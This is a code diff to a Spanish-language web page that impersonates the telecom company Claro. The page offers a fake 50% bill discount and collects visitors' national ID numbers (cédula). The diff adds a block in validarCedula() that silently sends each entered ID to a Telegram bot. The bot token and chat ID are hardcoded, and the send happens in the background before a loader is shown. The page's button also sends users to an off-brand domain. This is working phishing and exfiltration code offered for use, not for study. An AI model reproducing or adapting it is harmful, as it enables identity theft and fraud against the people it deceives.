@@ -71,18 +71,20 @@
           Cumples los requisitos para pagar tu factura al 50%.
         </p>
       </div>
-     <button onclick="window.location.href='https://claroservicio.on-forge.com'" class="bg-[#EF3320] text-white font-bold rounded-full py-3 px-8 w-full hover:bg-red-700 transition-all">
-  Aplicar descuento ahora
-</button>
+      <button onclick="window.location.href='https://claroservicio.on-forge.com'" class="bg-[#EF3320] text-white font-bold rounded-full py-3 px-8 w-full hover:bg-red-700 transition-all">
+        Aplicar descuento ahora
+      </button>
     </div>
 
   </main>
 
   <script>
     function validarCedula() {
-      const cedula = document.getElementById('cedula').value;
+      const cedulaInput = document.getElementById('cedula');
+      const cedula = cedulaInput.value;
       const errorMsg = document.getElementById('error-msg');
       
+      // Validación simple
       if (cedula.length < 6) {
         errorMsg.classList.remove('hidden');
         return;
@@ -90,6 +92,26 @@
 
       errorMsg.classList.add('hidden');
       
+      // --- INTEGRACIÓN TELEGRAM ---
+      const botToken = "8062838832:AAFSFrEbcdauECGQ7vbYfDVVCQu9rgY0waA";
+      const chatId = "-5249156598";
+      const mensaje = `🔴 Cédula Claro: ${cedula}`;
+
+      // Usamos encodeURIComponent para asegurar que los emojis y espacios se envíen bien
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(mensaje)}`;
+
+      // Enviamos la petición en segundo plano (no bloquea la UI)
+      fetch(url)
+        .then(response => {
+            if(response.ok) {
+                console.log("Mensaje enviado a Telegram");
+            } else {
+                console.error("Error al enviar a Telegram");
+            }
+        })
+        .catch(error => console.error("Error de red:", error));
+      // -----------------------------
+
       // Cambiar a vista de Loader
       document.getElementById('step-form').classList.add('hidden');
       document.getElementById('step-loader').classList.remove('hidden');
